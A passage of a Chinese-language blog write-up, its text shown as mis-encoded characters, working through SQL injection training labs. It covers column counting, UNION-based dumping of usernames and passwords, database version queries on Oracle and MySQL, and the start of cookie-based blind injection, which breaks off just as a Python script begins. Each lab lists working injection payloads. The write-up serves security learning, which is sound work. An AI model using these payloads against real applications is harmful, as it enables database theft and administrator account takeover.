<span class="line"></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>è¿™ä¸€ç³»åˆ—æœ‰æ•ˆè´Ÿè½½ä¿®æ”¹äº†åŸå§‹æŸ¥è¯¢ï¼Œä»¥æŒ‰ç…§ç»“æœé›†ä¸­çš„ä¸åŒåˆ—å¯¹ç»“æœè¿›è¡Œæ’åºã€‚order byå­å¥ä¸­çš„åˆ—å¯ä»¥é€šè¿‡å…¶ç´¢å¼•æŒ‡å®šï¼Œå› æ­¤æ‚¨ä¸éœ€è¦çŸ¥é“ä»»ä½•åˆ—çš„åç§°ã€‚å½“æŒ‡å®šçš„åˆ—ç´¢å¼•è¶…è¿‡ç»“æœé›†ä¸­å®é™…åˆ—çš„æ•°é‡æ—¶ï¼Œæ•°æ®åº“è¿”å›ä¸€ä¸ªé”™è¯¯ï¼Œä¾‹å¦‚ï¼š</p><div class="language-text line-numbers-mode" data-highlighter="prismjs" data-ext="text" data-title="text"><pre class="language-text"><code><span class="line">The ORDER BY position number 3 is out of range of the number of items in the select list.</span>
<span class="line"></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div></div></div><p>åº”ç”¨ç¨‹åºå¯èƒ½åœ¨å…¶HTTPå“åº”ä¸­å®é™…è¿”å›æ•°æ®åº“é”™è¯¯ï¼Œæˆ–è€…å®ƒå¯èƒ½è¿”å›ä¸€ä¸ªé€šç”¨é”™è¯¯ï¼Œæˆ–è€…åªæ˜¯ä¸è¿”å›ä»»ä½•ç»“æœã€‚å¦‚æœæ‚¨å¯ä»¥æ£€æµ‹åˆ°åº”ç”¨ç¨‹åºå“åº”ä¸­çš„ä¸€äº›å·®å¼‚ï¼Œæ‚¨å°±å¯ä»¥æ¨æ–­å‡ºæŸ¥è¯¢è¿”å›äº†å¤šå°‘åˆ—ã€‚</p><p>ä¾‹å¦‚ï¼šå‡è®¾æ³¨å…¥ç‚¹æ˜¯åŸå§‹æŸ¥è¯¢çš„WHEREå­å¥ä¸­å¸¦å¼•å·çš„å­—ç¬¦ä¸²ï¼Œåˆ™å¯ä»¥æäº¤order by 1è¯­å¥çš„æ„æ€æ˜¯æ ¹æ®ç¬¬ä¸€ä¸ªå­—æ®µæ’åº,æ¯”å¦‚æˆ‘çš„USERè¡¨æœ‰å››ä¸ªå­—æ®µï¼š</p><table><thead><tr><th>username</th><th>nickname</th><th>password</th><th>identity</th></tr></thead><tbody><tr><td>sake</td><td>sake</td><td>f4k3P@Ssw0rd</td><td>admin</td></tr><tr><td>visitor</td><td>visitor</td><td>123456</td><td>visitor</td></tr></tbody></table><p><code>order by 1</code>æ•ˆæœç­‰åŒäº<code>order by username</code>ï¼Œè€Œå¦‚æœ<code>order by 5</code>å°±ä¼šæŠ¥é”™ï¼Œå› ä¸ºè¶…è¿‡äº†æœ€å¤§åˆ—æ•°4ã€‚</p></li><li><p>ç¬¬äºŒç§æ–¹æ³•æ¶‰åŠæäº¤ä¸€ç³»åˆ—UNION SELECTæœ‰æ•ˆè´Ÿè½½ï¼ŒæŒ‡å®šä¸åŒæ•°é‡çš„ç©ºå€¼:</p><div class="language-text line-numbers-mode" data-highlighter="prismjs" data-ext="text" data-title="text"><pre class="language-text"><code><span class="line">&#39; UNION SELECT NULL-- </span>
<span class="line">&#39; UNION SELECT NULL,NULL-- </span>
<span class="line">&#39; UNION SELECT NULL,NULL,NULL-- </span>
<span class="line"></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>å¦‚æœnullçš„æ•°ç›®ä¸åˆ—çš„æ•°ç›®ä¸åŒ¹é…ï¼Œåˆ™æ•°æ®åº“è¿”å›ä¸€ä¸ªé”™è¯¯ï¼Œä¾‹å¦‚:</p><div class="language-text line-numbers-mode" data-highlighter="prismjs" data-ext="text" data-title="text"><pre class="language-text"><code><span class="line">All queries combined using a UNION, INTERSECT or EXCEPT operator must have an equal number of expressions in their target lists.</span>
<span class="line"></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div></div></div><p>ä½¿ç”¨UNIONï¼ŒINTERSECTæˆ–EXCEPTè¿ç®—ç¬¦ç»„åˆçš„æ‰€æœ‰æŸ¥è¯¢åœ¨å…¶ç›®æ ‡åˆ—è¡¨ä¸­å¿…é¡»å…·æœ‰ç›¸ç­‰æ•°é‡çš„è¡¨è¾¾å¼ã€‚åŒæ ·ï¼Œåº”ç”¨ç¨‹åºå®é™…ä¸Šå¯èƒ½è¿”å›æ­¤é”™è¯¯æ¶ˆæ¯ï¼Œæˆ–è€…å¯èƒ½ä»…è¿”å›ä¸€èˆ¬é”™è¯¯æˆ–æ²¡æœ‰ç»“æœã€‚å½“ç©ºæ•°ä¸åˆ—æ•°åŒ¹é…æ—¶ï¼Œæ•°æ®åº“å°†åœ¨ç»“æœé›†ä¸­è¿”å›å¦ä¸€è¡Œï¼Œå…¶ä¸­æ¯ä¸€åˆ—å‡åŒ…å«ç©ºå€¼ã€‚å¯¹äº§ç”Ÿçš„HTTPå“åº”çš„å½±å“å–å†³äºåº”ç”¨ç¨‹åºçš„ä»£ç ã€‚</p><p><strong>éœ€è¦æ³¨æ„çš„æ˜¯ï¼š</strong></p><ul><li>ä½¿ç”¨NULLä½œä¸ºUNION SELECTæ³¨å…¥æŸ¥è¯¢è¿”å›å€¼çš„åŸå› æ˜¯æ¯åˆ—ä¸­çš„æ•°æ®ç±»å‹å¿…é¡»åœ¨åŸå§‹æŸ¥è¯¢å’Œæ³¨å…¥æŸ¥è¯¢ä¹‹é—´å…¼å®¹ã€‚ç”±äºNULLå¯ä»¥è½¬æ¢ä¸ºæ¯ç§å¸¸ç”¨çš„æ•°æ®ç±»å‹ï¼Œå› æ­¤ä½¿ç”¨NULLå¯ä»¥æœ€å¤§é™åº¦åœ°æé«˜åœ¨åˆ—è®¡æ•°æ­£ç¡®æ—¶æˆåŠŸçš„æœºä¼šã€‚</li><li>ç”¨æ¥æ³¨é‡Šçš„ <strong>åŒç ´æŠ˜å·--</strong> å¯ä»¥æ³¨é‡Šæ‰æ³¨å…¥ç‚¹ä¹‹åçš„åŸå§‹æŸ¥è¯¢çš„å…¶ä½™éƒ¨åˆ†ã€‚ä½†åœ¨MySQLä¸Šï¼ŒåŒç ´æŠ˜å·åºåˆ—åé¢å¿…é¡»è·Ÿä¸€ä¸ªç©ºæ ¼ï¼Œæˆ–è€…ç›´æ¥ä½¿ç”¨ <strong>äº•å·#</strong> æ¥è¿›è¡Œæ³¨é‡Šã€‚</li></ul></li></ul></blockquote><p>ä½¿ç”¨ç¬¬äºŒç§æ–¹æ³•ï¼Œå½“æŒ‡å®šä¸€ä¸ªå’Œä¸¤ä¸ªç©ºå€¼æ—¶æŠ¥é”™</p><p><img src="/sake-s-blog/assets/image-20221110161852585-DN83BDsu.png" alt="image-20221110161852585"></p><p>å½“æŒ‡å®šä¸‰ä¸ªç©ºå€¼æ—¶æ²¡æœ‰æŠ¥é”™ï¼ŒæˆåŠŸè§£å†³Lab</p><p><img src="/sake-s-blog/assets/image-20221110161959250-heeew6RT.png" alt="image-20221110161959250"></p><p>payloadï¼š</p><div class="language-text line-numbers-mode" data-highlighter="prismjs" data-ext="text" data-title="text"><pre class="language-text"><code><span class="line">/filter?category=Gifts&#39; UNION SELECT NULL,NULL,NULL--</span>
<span class="line"></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div></div></div><h2 id="unionæ”»å‡»æŸ¥æ‰¾åŒ…å«æ–‡æœ¬çš„åˆ—" tabindex="-1"><a class="header-anchor" href="#unionæ”»å‡»æŸ¥æ‰¾åŒ…å«æ–‡æœ¬çš„åˆ—"><span><strong>UNIONæ”»å‡»æŸ¥æ‰¾åŒ…å«æ–‡æœ¬çš„åˆ—</strong></span></a></h2><blockquote><p>ä»»åŠ¡æ˜¯è®©æ•°æ®åº“æ£€ç´¢å¹¶å–å›å­—ç¬¦ä¸²<code>&#39;kTe3Gu&#39;</code>ï¼Œç±»ä¼¼äºä¸Šé¢˜ï¼Œæˆ‘ä»¬ä½¿ç”¨UNION SELECTæäº¤æœ‰æ•ˆè´Ÿè½½ï¼Œå†æŒ‡å®šæŸä¸€å­—æ®µä¸º<code>&#39;kTe3Gu&#39;</code>ã€‚</p></blockquote><p><img src="/sake-s-blog/assets/image-20221110163329744-DBoj8SdF.png" alt="image-20221110163329744"></p><p>å…ˆä½¿ç”¨ä¸Šä¸€é¢˜çš„æ–¹æ³•åˆ¤æ–­åˆ—æ•°ï¼Œè¿™é‡Œç•¥å»ï¼Œç»åˆ¤æ–­ä¸ºåˆ—æ•°ä¸º3ã€‚ç„¶åå…ˆæŒ‡å®šç¬¬ä¸€ä¸ªå­—æ®µä¸º<code>&#39;kTe3Gu&#39;</code>ï¼Œæ˜¾ç¤ºæŠ¥é”™</p><p><img src="/sake-s-blog/assets/image-20221110164015098-D_Xvghs5.png" alt="image-20221110164015098"></p><p>å°è¯•æŒ‡å®šç¬¬äºŒä¸ªå­—æ®µä¸º<code>&#39;kTe3Gu&#39;</code>ï¼Œæ²¡æœ‰æŠ¥é”™ï¼ŒæˆåŠŸè§£å†³Lab</p><p><img src="/sake-s-blog/assets/image-20221110164235270-dPVQs-mC.png" alt="image-20221110164235270"></p><p>payloadï¼š</p><div class="language-text line-numbers-mode" data-highlighter="prismjs" data-ext="text" data-title="text"><pre class="language-text"><code><span class="line">/filter?category=Pets&#39; UNION SELECT NULL,&#39;kTe3Gu&#39;,NULL--</span>
<span class="line"></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div></div></div><h2 id="unionæ”»å‡»ä»å…¶ä»–è¡¨ä¸­æ£€ç´¢æ•°æ®" tabindex="-1"><a class="header-anchor" href="#unionæ”»å‡»ä»å…¶ä»–è¡¨ä¸­æ£€ç´¢æ•°æ®"><span><strong>UNIONæ”»å‡»ä»å…¶ä»–è¡¨ä¸­æ£€ç´¢æ•°æ®</strong></span></a></h2><blockquote><p>ä»»åŠ¡ï¼šè¯¥æ•°æ®åº“åŒ…å«ä¸€ä¸ªä¸åŒçš„è¡¨ï¼Œç§°ä¸º <code>users</code>, åˆ—ç§°ä¸º <code>username</code>å’Œ <code>password</code>ã€‚é€šè¿‡UNIONæ”»å‡»ï¼Œæ£€ç´¢æ‰€æœ‰ç”¨æˆ·åå’Œå¯†ç ï¼Œå¹¶ä½¿ç”¨è¯¥ä¿¡æ¯ä»¥ <code>administrator</code>ç”¨æˆ·ã€‚</p></blockquote><p>å…ˆç”¨ä¸Šä¸Šé¢˜çš„æ–¹æ³•åˆ¤æ–­åˆ—æ•°ï¼Œè¿™é‡Œç•¥å»ï¼Œç»æ£€éªŒåˆ—æ•°ä¸º2ã€‚ç„¶åç”¨ä¸Šä¸€é¢˜çš„æ–¹æ³•æŸ¥æ‰¾åŒ…å«æ–‡æœ¬çš„åˆ—ï¼Œç»æ£€éªŒä¸¤åˆ—éƒ½åŒ…å«æ–‡æœ¬ã€‚ç„¶åä½¿ç”¨<code>&#39;UNION SELECT username,password FROM users--</code> ä»<code>users</code>é‡Œæ£€ç´¢æ‰€æœ‰<code>username</code>å’Œ<code>password</code>ï¼Œæˆ‘ä»¬å¯ä»¥çœ‹åˆ°<code>administrator</code>çš„ç”¨æˆ·åå’Œå¯†ç éƒ½è¢«è¿”è¿˜äº†</p><p><img src="/sake-s-blog/assets/image-20221111121905642-BrJ1s6mh.png" alt="image-20221111121905642"></p><p>æˆ‘ä»¬å°è¯•ä½¿ç”¨<code>administrator</code>çš„è´¦å·ç™»å½•ï¼ŒæˆåŠŸä»¥ç®¡ç†å‘˜èº«ä»½ç™»å½•</p><p><img src="/sake-s-blog/assets/image-20221111122210482-DWfl-Q0H.png" alt="image-20221111122210482"></p><p><img src="/sake-s-blog/assets/image-20221111122246286-iOmUgpy2.png" alt="image-20221111122246286"></p><p>payloadï¼š</p><div class="language-text line-numbers-mode" data-highlighter="prismjs" data-ext="text" data-title="text"><pre class="language-text"><code><span class="line">/filter?category=Gifts&#39;UNION SELECT username,password FROM users-- </span>
<span class="line"></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div></div></div><h2 id="union-æ”»å‡»åœ¨å•ä¸ªåˆ—ä¸­æ£€ç´¢å¤šä¸ªå€¼" tabindex="-1"><a class="header-anchor" href="#union-æ”»å‡»åœ¨å•ä¸ªåˆ—ä¸­æ£€ç´¢å¤šä¸ªå€¼"><span><strong>UNION æ”»å‡»åœ¨å•ä¸ªåˆ—ä¸­æ£€ç´¢å¤šä¸ªå€¼</strong></span></a></h2><blockquote><p>ä»»åŠ¡æ˜¯å°†åŒä¸€åˆ—çš„<code>username</code>å’Œ<code>password</code>ä¸€èµ·è¾“å‡ºï¼Œç¡®å®š<code>administrator</code>å¯¹åº”çš„å¯†ç æ˜¯ä»€ä¹ˆã€‚</p><p>æˆ‘ä»¬é¦–å…ˆè¦äº†è§£ä¸€ä¸‹<strong>SQLå­—ç¬¦ä¸²è¿æ¥</strong>çš„æ–¹æ³•ï¼š</p><table><thead><tr><th>æ•°æ®åº“</th><th>è¯­å¥</th></tr></thead><tbody><tr><td>ç”²éª¨æ–‡</td><td>&#39;foo&#39;||&#39;bar&#39;</td></tr><tr><td>å¾®è½¯</td><td>&#39;foo&#39;+&#39;bar&#39;</td></tr><tr><td>PostgreSQL</td><td>&#39;foo&#39;||&#39;bar&#39;</td></tr><tr><td>MySQL</td><td>&#39;foo&#39; &#39;bar&#39;<strong>[æ³¨æ„ä¸¤ä¸ªå­—ç¬¦ä¸²ä¹‹é—´çš„ç©ºæ ¼]</strong><br> CONCAT(&#39;foo&#39;,&#39;bar&#39;)</td></tr></tbody></table><p>æ‰€ä»¥æˆ‘ä»¬æƒ³åˆ°å¯ä»¥ç”¨è¿™äº›è¯­å¥æ¥å°†<code>username</code>å’Œ<code>password</code>è¿æ¥</p></blockquote><p>è¿˜æ˜¯è€è§„çŸ©åˆ¤æ–­åˆ—æ•°ï¼Œåˆ—æ•°ä¸º2ã€‚ç„¶åæŸ¥æ‰¾åŒ…å«æ–‡æœ¬çš„åˆ—ï¼Œç¬¬äºŒåˆ—åŒ…å«æ–‡æœ¬ã€‚ç„¶åä½¿ç”¨<code>&#39;UNION SELECT NULL,username||password FROM users--</code> ä»<code>users</code>é‡Œæ£€ç´¢ç¬¬äºŒåˆ—çš„<code>username</code>å’Œ<code>password</code>ï¼Œæˆ‘ä»¬å¯ä»¥çœ‹åˆ°administratorçš„ç”¨æˆ·åå’Œå¯†ç éƒ½è¢«è¿”è¿˜äº†ï¼Œä½†æ˜¯ä¸¤ä¸ªå­—ç¬¦ä¸²é»åœ¨ä¸€èµ·äº†</p><p><img src="/sake-s-blog/assets/image-20221111151636225-C2TJ_Eiv.png" alt="image-20221111151636225"></p><p>æˆ‘ä»¬åœ¨ä¸­é—´æ·»åŠ ä¸€æ®µå­—ç¬¦ä¸²æ¥åŒºåˆ†<code>username</code>å’Œ<code>password</code></p><p><img src="/sake-s-blog/assets/image-20221111151724705-BJCgGAGQ.png" alt="image-20221111151724705"></p><p>å°è¯•ç™»å½•administratorï¼ŒæˆåŠŸä»¥ç®¡ç†å‘˜èº«ä»½ç™»å½•</p><p><img src="/sake-s-blog/assets/image-20221111151946791-CXpE-gRZ.png" alt="image-20221111151946791"></p><p>payloadï¼š</p><div class="language-text line-numbers-mode" data-highlighter="prismjs" data-ext="text" data-title="text"><pre class="language-text"><code><span class="line">/filter?category=Pets&#39;UNION SELECT NULL,username||&#39;^^^^^^&#39;||password FROM users--</span>
<span class="line"></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div></div></div><h2 id="æŸ¥è¯¢oracleä¸Šçš„æ•°æ®åº“ç±»å‹å’Œç‰ˆæœ¬" tabindex="-1"><a class="header-anchor" href="#æŸ¥è¯¢oracleä¸Šçš„æ•°æ®åº“ç±»å‹å’Œç‰ˆæœ¬"><span><strong>æŸ¥è¯¢Oracleä¸Šçš„æ•°æ®åº“ç±»å‹å’Œç‰ˆæœ¬</strong></span></a></h2><blockquote><p>ä»»åŠ¡æ˜¯ä½¿æ•°æ®åº“æ£€ç´¢ä»¥ä¸‹å­—ç¬¦ä¸²ï¼š&#39;Oracle Database 11g Express Edition Release 11.2.0.2.0 -64bit Production, PL/SQL Release 11.2.0.2.0-Production, CORE-11.2.0.2.0-Productionï¼Œ,TNS forLinux: Version 11.2.0.2.0 - Production,NLSRTL Version 11.2.0.2.0 - Production&#39;</p><p>æˆ‘ä»¬é¦–å…ˆè¦äº†è§£å¦‚ä½•<strong>æŸ¥è¯¢æ•°æ®åº“çš„ç±»å‹å’Œç‰ˆæœ¬</strong>ï¼š</p><table><thead><tr><th>æ•°æ®åº“</th><th>è¯­å¥</th></tr></thead><tbody><tr><td>ç”²éª¨æ–‡</td><td>SELECT banner FROM v$version<br>SELECT version FROM v$instance</td></tr><tr><td>å¾®è½¯</td><td>SELECT @@version</td></tr><tr><td>PostgreSQL</td><td>SELECT version()</td></tr><tr><td>MySQL</td><td>SELECT @@version</td></tr></tbody></table></blockquote><p>å‰ä¸¤æ­¥åŒä¸Šè¿°Labï¼Œç„¶ååˆ©ç”¨æŸ¥è¯¢æ•°æ®åº“ç±»å‹å’Œç‰ˆæœ¬çš„è¯­å¥è¿›è¡Œç‰ˆæœ¬æŸ¥è¯¢ï¼ŒæˆåŠŸè§£å†³Lab</p><p><img src="/sake-s-blog/assets/image-20221111152956925-BilJ4-AV.png" alt="image-20221111152956925"></p><p>payloadï¼š</p><div class="language-text line-numbers-mode" data-highlighter="prismjs" data-ext="text" data-title="text"><pre class="language-text"><code><span class="line">/filter?category=Lifestyle&#39; UNION SELECT BANNER,NULL FROM v$version--</span>
<span class="line"></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div></div></div><h2 id="æŸ¥è¯¢mysqlå’Œå¾®è½¯ä¸Šçš„æ•°æ®åº“ç±»å‹å’Œç‰ˆæœ¬" tabindex="-1"><a class="header-anchor" href="#æŸ¥è¯¢mysqlå’Œå¾®è½¯ä¸Šçš„æ•°æ®åº“ç±»å‹å’Œç‰ˆæœ¬"><span>æŸ¥è¯¢MySQLå’Œå¾®è½¯ä¸Šçš„æ•°æ®åº“ç±»å‹å’Œç‰ˆæœ¬</span></a></h2><blockquote><p>è¿™ä¸ªLabå’Œä¸Šé¢é‚£é¢˜åŸºæœ¬ä¸€æ ·çš„åšæ³•ï¼Œå”¯ä¸€è¦æ³¨æ„çš„æ˜¯ï¼Œä¸åŒæ•°æ®åº“ä¹‹é—´æ³¨é‡Šçš„æ–¹æ³•ä¸åŒã€‚</p></blockquote><p><img src="/sake-s-blog/assets/image-20221111155420535-ZHXF-LY5.png" alt="image-20221111155420535"></p><p>payloadï¼š</p><div class="language-text line-numbers-mode" data-highlighter="prismjs" data-ext="text" data-title="text"><pre class="language-text"><code><span class="line">/filter?category=Gifts&#39;UNION SELECT @@version,NULL-- comment</span>
<span class="line"></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div></div></div><h2 id="åˆ—å‡ºé-oracle-æ•°æ®åº“ä¸Šçš„æ•°æ®åº“å†…å®¹" tabindex="-1"><a class="header-anchor" href="#åˆ—å‡ºé-oracle-æ•°æ®åº“ä¸Šçš„æ•°æ®åº“å†…å®¹"><span><strong>åˆ—å‡ºé Oracle æ•°æ®åº“ä¸Šçš„æ•°æ®åº“å†…å®¹</strong></span></a></h2><blockquote><p>è¿™é‡Œæˆ‘ä»¬äº†è§£ä¸€ä¸‹å¦‚ä½•æŸ¥è¯¢ä¸åŒæ•°æ®åº“çš„æ•°æ®åº“å†…å®¹ï¼ˆæ‚¨å¯ä»¥åˆ—å‡ºæ•°æ®åº“ä¸­å­˜åœ¨çš„è¡¨ï¼Œä»¥åŠè¿™äº›è¡¨åŒ…å«çš„åˆ—ï¼‰ï¼š</p><table><thead><tr><th>æ•°æ®åº“</th><th>è¯­å¥</th></tr></thead><tbody><tr><td>ç”²éª¨æ–‡</td><td>SELECT * FROM all_tables<br>SELECT * FROM all_tab_columns WHERE table_name = &#39;TABLE-NAME-HERE&#39;</td></tr><tr><td>å¾®è½¯</td><td>SELECT * FROM information_schema.tables<br>SELECT * FROM information_schema.columns WHERE table_name = &#39;TABLE-NAME-HERE&#39;</td></tr><tr><td>PostgreSQL</td><td>SELECT * FROM information_schema.tables<br>SELECT * FROM information_schema.columns WHERE table_name = &#39;TABLE-NAME-HERE&#39;</td></tr><tr><td>MySQL</td><td>SELECT * FROM information_schema.tables<br>SELECT * FROM information_schema.columns WHERE table_name = &#39;TABLE-NAME-HERE&#39;</td></tr></tbody></table></blockquote><p>å‰ä¸¤æ­¥åŒä¸Šè¿°Labï¼Œè¿™é‡Œæˆ‘ä»¬ä½¿ç”¨<code>&#39;UNION SELECT table_name,NULL FROM information_schema.tables-- qq</code>æ¥æŸ¥è¯¢è¡¨åï¼Œè¿”è¿˜äº†å¾ˆå¤šè¡¨ï¼Œå¾€ä¸‹ç¿»æ‰¾åˆ°usersçš„è¡¨</p><p><img src="/sake-s-blog/assets/image-20221111160613232-Dy-2zxuC.png" alt="image-20221111160613232"></p><p>å†ä½¿ç”¨<code>&#39;UNION SELECT column_name,NULL FROM information_schema.columns WHERE table_name = &#39;users_etflvr&#39;-- qq</code>æŸ¥è¯¢åˆ—åï¼ŒæŸ¥çœ‹è¿™ä¸ªè¡¨åŒ…å«çš„åˆ—ï¼Œçœ‹åˆ°å…³é”®çš„usernameå’Œpasswordç›¸å…³çš„åˆ—</p><p><img src="/sake-s-blog/assets/image-20221111161135183-2v07g2uF.png" alt="image-20221111161135183"></p><p>ç„¶åä½¿ç”¨<code>&#39;UNION SELECT username_wpfvrw,password_lqkvfp FROM users_etflvr-- qq</code>æ¥æŸ¥è¯¢usernameåˆ—å’Œpasswordåˆ—çš„å­—æ®µå†…å®¹ï¼Œå‘ç°administratorçš„ç”¨æˆ·åå’Œå¯†ç </p><p><img src="/sake-s-blog/assets/image-20221111162051034-B0yKEf3O.png" alt="image-20221111162051034"></p><p>ç™»å½•administratoræˆåŠŸè§£å†³Lab</p><p><img src="/sake-s-blog/assets/image-20221111162300011-UusOMRRI.png" alt="image-20221111162300011"></p><p>payloadï¼š</p><div class="language-text line-numbers-mode" data-highlighter="prismjs" data-ext="text" data-title="text"><pre class="language-text"><code><span class="line">/filter?category=Pets&#39;UNION SELECT table_name,NULL FROM information_schema.tables-- qq</span>
<span class="line">/filter?category=Pets&#39;UNION SELECT column_name,NULL FROM information_schema.columns WHERE table_name = &#39;users_etflvr&#39;-- qq</span>
<span class="line">/filter?category=Pets&#39;UNION SELECT username_wpfvrw,password_lqkvfp FROM users_etflvr-- qq</span>
<span class="line"></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><h2 id="åˆ—å‡ºoracleä¸Šçš„æ•°æ®åº“å†…å®¹" tabindex="-1"><a class="header-anchor" href="#åˆ—å‡ºoracleä¸Šçš„æ•°æ®åº“å†…å®¹"><span><strong>åˆ—å‡ºOracleä¸Šçš„æ•°æ®åº“å†…å®¹</strong></span></a></h2><blockquote><p>è¿™ä¸ªLabå’Œä¸Šé¢é‚£é¢˜åŸºæœ¬ä¸€æ ·çš„åšæ³•ï¼Œè¿™é‡Œçœå»ä¸€äº›æ­¥éª¤</p></blockquote><p>æŸ¥è¯¢åˆ°usersè¡¨<img src="/sake-s-blog/assets/image-20221111162901683-BnfRkC7n.png" alt="image-20221111162901683"></p><p>æŸ¥è¯¢åˆ°usernameåˆ—å’Œpasswordåˆ—</p><p><img src="/sake-s-blog/assets/image-20221111163210546-B6Mi9QHE.png" alt="image-20221111163210546"></p><p>æŸ¥è¯¢usernameå’Œpasswordçš„å­—æ®µå†…å®¹</p><p><img src="/sake-s-blog/assets/image-20221111163457415-DCD3dzJW.png" alt="image-20221111163457415"></p><p>ä»¥administratorç™»å½•ï¼ŒæˆåŠŸè§£å†³Lab</p><p><img src="/sake-s-blog/assets/image-20221111163859550-CnQuH_1K.png" alt="image-20221111163859550"></p><p>payloadï¼š</p><div class="language-text line-numbers-mode" data-highlighter="prismjs" data-ext="text" data-title="text"><pre class="language-text"><code><span class="line">/filter?category=Gifts&#39;UNION SELECT table_name,NULL FROM all_tables--</span>
<span class="line">/filter?category=Gifts&#39;UNION SELECT column_name,NULL FROM all_tab_columns WHERE table_name = &#39;USERS_REILEX&#39;--</span>
<span class="line">/filter?category=Gifts&#39;UNION SELECT USERNAME_IOYYXQ,PASSWORD_LFYLDI FROM USERS_REILEX--</span>
<span class="line"></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><h2 id="å¸¦æœ‰æ¡ä»¶å“åº”çš„sqlç›²æ³¨" tabindex="-1"><a class="header-anchor" href="#å¸¦æœ‰æ¡ä»¶å“åº”çš„sqlç›²æ³¨"><span>å¸¦æœ‰æ¡ä»¶å“åº”çš„SQLç›²æ³¨</span></a></h2><blockquote><p><strong>åˆšå¼€å§‹ä»¥ä¸ºåƒä¸Šé¢Labä¸€æ ·æ˜¯GETæäº¤ï¼Œè¯•äº†å‡ æ¬¡å‘ç°ä¸å¯¹åŠ²ï¼ˆ<s>è‰ï¼Œæ€ä¹ˆ100ä¹Ÿä¸æŠ¥é”™</s>â“ï¼‰ï¼Œç„äº†ä¸€çœ¼å®˜æ–¹çš„é¢˜è§£ï¼ŒåŸæ¥æ³¨å…¥ç‚¹åœ¨cookie</strong>ğŸ’«</p></blockquote><p><img src="/sake-s-blog/assets/image-20221112204213704-CRk0TW4T.png" alt="image-20221112204213704"></p><p>åœ¨hackbarä¸Šæ“ä½œä¸æ˜¯å¾ˆæ–¹ä¾¿ï¼Œå†³å®šæ”¹ç”¨burpï¼Œç›´æ¥è¯•ç€åœ¨cookieæ¥ä¸ª<code>&#39;and&#39;1&#39;=&#39;1</code>ç„¶åå‘åŒ…ï¼Œæ¥ç€å†è¯•ç€<code>&#39;and&#39;1&#39;=&#39;2</code>ï¼Œæ³¨æ„åˆ°ä¸¤è€…çš„è¿”å›åŒ…çš„é•¿åº¦ä¸åŒ</p><p><img src="/sake-s-blog/assets/image-20221112205400706-DwVIau2D.png" alt="image-20221112205400706"></p><p><img src="/sake-s-blog/assets/image-20221112205438159-BiMYdowR.png" alt="image-20221112205438159"></p><p>ç›´æ¥å°†ä¸¤ä¸ªåŒ…å‘åˆ°burpçš„comparerè¿›è¡Œæ¯”è¾ƒï¼Œå‘ç°é€»è¾‘è¿ç®—ç»“æœä¸ºtrueçš„å¤šè¿”è¿˜äº†<code>Welcome back!</code></p><p><img src="/sake-s-blog/assets/image-20221112210453490-Db3tZpKG.png" alt="image-20221112210453490"></p><p>è¿™é‡Œæˆ‘ä»¬ä½¿ç”¨<code>&#39; AND (SELECT &#39;a&#39; FROM users LIMIT 1)=&#39;a</code> è¿™æ¡è¯­å¥æ¥ç¡®è®¤å­˜ä¸å­˜åœ¨usersè¿™ä¸ªè¡¨ï¼Œè¿”å›ä¸ºçœŸ</p><p><img src="/sake-s-blog/assets/image-20221112215832981-Bg9y9NkC.png" alt="image-20221112215832981"></p><p>æˆ‘ä»¬å†ç”¨<code>&#39; AND (SELECT &#39;a&#39; FROM users WHERE username=&#39;administrator&#39; AND LENGTH(password)&gt;1)=&#39;a</code>è¿™æ¡è¯­å¥æ¥åˆ¤æ–­administratorè¿™ä¸ªç”¨æˆ·çš„å¯†ç é•¿åº¦æ˜¯å¦å¤§äº1ï¼Œè¿”å›ä¸ºçœŸ</p><p><img src="/sake-s-blog/assets/image-20221113171121705-COzkFGCa.png" alt="image-20221113171121705"></p><p>é€šè¿‡ä¸€ç³»åˆ—æ‰‹æ³¨åˆ¤æ–­å‡ºæ¥ï¼Œadministratorçš„å¯†ç é•¿åº¦ä¸º20ä½ï¼ˆğŸ˜¨å‚»çœ¼ï¼Ÿï¼Ÿï¼‰</p><p><img src="/sake-s-blog/assets/image-20221113171425361-CvPw3S_y.png" alt="image-20221113171425361"></p><p>æ¥ä¸‹æ¥å°±æ˜¯é€å­—ç¬¦çˆ†ç ´å¯†ç äº†ï¼Œä½¿ç”¨<code>&#39; AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username=&#39;administrator&#39;)=&#39;a</code>è¯­å¥æ¥åˆ¤æ–­ç¬¬ä¸€ä¸ªå­—ç¬¦æ˜¯ä¸æ˜¯aï¼Œæ¥ç€æˆ‘ä»¬æ„å»ºç±»ä¼¼çš„è¯­å¥æ¥é€å­—ç¬¦åˆ¤æ–­ï¼Œè¿™é‡Œå¯ä»¥ä½¿ç”¨Intruderï¼Œä¸è¿‡æˆ‘æ›´å–œæ¬¢ç”¨pythonï¼Œè¿™é‡Œç›´æ¥ç»™å‡ºä¸€ä¸ªæˆ‘å†™çš„è„šæœ¬ï¼ˆå•çº¿ç¨‹éå¸¸éå¸¸æ…¢ï¼Œè¯•ç€å†™äº†ä¸‹å¤šçº¿ç¨‹ï¼ŒğŸ¥¬ç åŠ›ä¸ç²¾è½»å–·ğŸ¥ºï¼‰</p><div class="language-python line-numbers-mode" data-highlighter="prismjs" data-ext="py" data-title="py"><pre class="language-python"><code><span class="line"><span class="token keyword">import</span> requests</span>
